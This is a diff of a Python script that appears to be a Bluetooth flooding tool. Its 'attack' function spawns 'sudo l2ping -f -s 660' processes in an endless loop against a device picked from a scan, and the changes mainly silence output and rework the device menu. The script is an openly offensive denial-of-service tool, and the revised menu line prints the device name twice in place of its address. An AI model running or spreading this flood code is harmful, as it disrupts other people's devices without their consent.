@@ -15,7 +15,7 @@ def bye():
     print("\nBye!")
     from time import sleep
     sleep(1)
-    # print("\033c")
+    print("\033c")
 
 
 def get_devices():
@@ -33,7 +33,9 @@ def attack(target):
 
     def sp():
         while 1:
-            subprocess.Popen(['sudo', 'l2ping', '-f', '-s', '660', target[0]], stderr=subprocess.STDOUT)
+            subprocess.Popen(['sudo', 'l2ping', '-f', '-s', '660', target[0]],
+                             stderr=subprocess.STDOUT,
+                             stdout=subprocess.DEVNULL)
 
     print("Attacking '%s'...\nTo stop type Ctrl+C" % target[1])
     try:
@@ -57,8 +59,9 @@ def main():
         attack(devices[0])
     else:
         print("Several devices found:")
-        for dev in range(dev_number):
-            print("%d) '%s' <%s>" % (dev, devices[dev][1], devices[dev][0]))
+        for index, device in enumerate(devices):
+            # print("%d) '%s' <%s>" % (dev, devices[dev][1], devices[dev][0]))
+            print(f"{index}: '{device[1]}'\t{device[1]}")
         while 1:
             try:
                 target_i = int(input("Select a device (0-%d): " % (dev_number - 1)))
